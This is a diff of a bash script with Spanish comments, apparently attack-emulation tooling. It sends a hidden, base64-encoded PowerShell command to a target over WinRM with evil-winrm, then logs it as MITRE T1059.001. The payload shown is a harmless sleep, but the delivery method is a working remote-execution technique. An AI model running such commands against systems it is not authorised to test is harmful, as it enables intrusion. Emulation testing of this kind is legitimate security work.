@@ -13,6 +13,9 @@ echo "[+] Entregando y ejecutando payload de prueba en ${TARGET} via WinRM (evil
 read -rp "Usuario WinRM: " WU
 read -rsp "Password WinRM: " WP; echo
 CMD='powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQA='
-evil-winrm -i "${TARGET}" -u "${WU}" -p "${WP}" -e "${CMD}" 2>&1 | tee "/tmp/payload_$(date +%s).log" || true
+# evil-winrm no tiene un flag para ejecutar un solo comando (-e es la ruta de
+# ejecutables C#, no un comando); es una shell interactiva, así que el
+# comando se envía por stdin como si se hubiera escrito en el prompt remoto.
+{ echo "${CMD}"; echo "exit"; } | evil-winrm -i "${TARGET}" -u "${WU}" -p "${WP}" 2>&1 | tee "/tmp/payload_$(date +%s).log" || true
 log_fin "payload_execution" "T1059.001" "${TARGET}" "${INICIO}" "1"
 echo "[+] Ataque registrado en log_ataques.csv"
